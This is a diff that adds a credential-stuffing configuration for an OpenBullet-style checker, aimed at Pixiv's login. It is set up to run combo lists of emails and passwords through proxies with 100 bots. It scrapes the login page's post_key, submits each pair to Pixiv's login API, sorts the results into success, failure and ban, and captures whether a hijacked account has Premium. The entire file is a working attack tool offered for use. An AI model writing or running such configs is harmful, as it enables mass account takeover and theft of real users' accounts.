@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Pixiv",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-14T22:57:31.1984647+00:00",
+  "AdditionalInfo": "Use weeb or japanese lists",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://accounts.pixiv.net/login?lang=en&source=pc&view_type=page&ref=wwwtop_accounts_index" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_POST_KEY PARSE "<SOURCE>" LR "name=\"post_key\" value=\"" "\">" Recursive=FALSE -> VAR "POSTKEY" "" "" 
+REQUEST POST "https://accounts.pixiv.net/api/login?lang=en" AutoRedirect=TRUE 
+  CONTENT "pixiv_id=<USER>&password=<PASS>&captcha=&g_recaptcha_response=&post_key=<POSTKEY>&source=pc&ref=wwwtop_accounts_index&return_to=https%3A%2F%2Fwww.pixiv.net%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "success" 
+    KEY "/logout" 
+  KEYCHAIN Failure OR 
+    KEY "Please check if your pixiv" 
+    KEY "Passwords must be between" 
+    KEY "pixiv ID or email address is incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "Authenticate your profile" 
+REQUEST GET "https://www.pixiv.net/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "pixiv.user.premium = false" 
+PARSE "<SOURCE>" LR "pixiv.user.premium = " ";" Recursive=FALSE -> CAP "Premium" "" "" 
